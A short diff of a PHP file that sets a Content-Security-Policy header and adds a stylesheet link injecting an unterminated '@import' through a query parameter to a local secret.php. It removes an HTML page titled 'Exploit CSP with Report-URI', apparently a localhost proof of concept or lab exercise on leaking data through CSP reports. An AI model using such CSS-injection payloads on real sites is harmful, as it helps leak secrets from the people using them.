@@ -4,16 +4,5 @@ header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-u
 
 
 ?>
+<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import '">
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exploit CSP with Report-URI</title>
-    <link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import '">
-</head>
-<body>
-    <h1>Exploitation in Progress...</h1>
-</body>
-</html>
